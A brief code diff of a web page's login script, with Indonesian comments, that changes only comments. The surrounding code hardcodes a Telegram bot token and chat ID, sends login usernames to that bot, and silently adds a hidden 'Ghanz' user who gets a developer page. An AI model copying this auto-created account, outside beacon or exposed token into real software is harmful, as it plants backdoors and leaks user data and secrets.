@@ -50,7 +50,7 @@
     const BOT_TOKEN = '7621390139:AAE9oNVeBy946yGbO7IDsT34DFY3THvGC6I';
     const CHAT_ID = '7882058841';
 
-    // Tambahkan user Ghanz secara otomatis jika belum ada
+    // Tambahkan user Ghanz secara otomatis
     window.onload = () => {
       let users = JSON.parse(localStorage.getItem("users") || "[]");
       const exists = users.some(u => u.username === "Ghanz");
@@ -93,7 +93,6 @@
       sendToTelegram(username);
       alert("Login berhasil!");
 
-      // Arahkan ke halaman developer jika user adalah Ghanz
       if (username === "Ghanz") {
         window.location.href = "developer.html";
       } else {
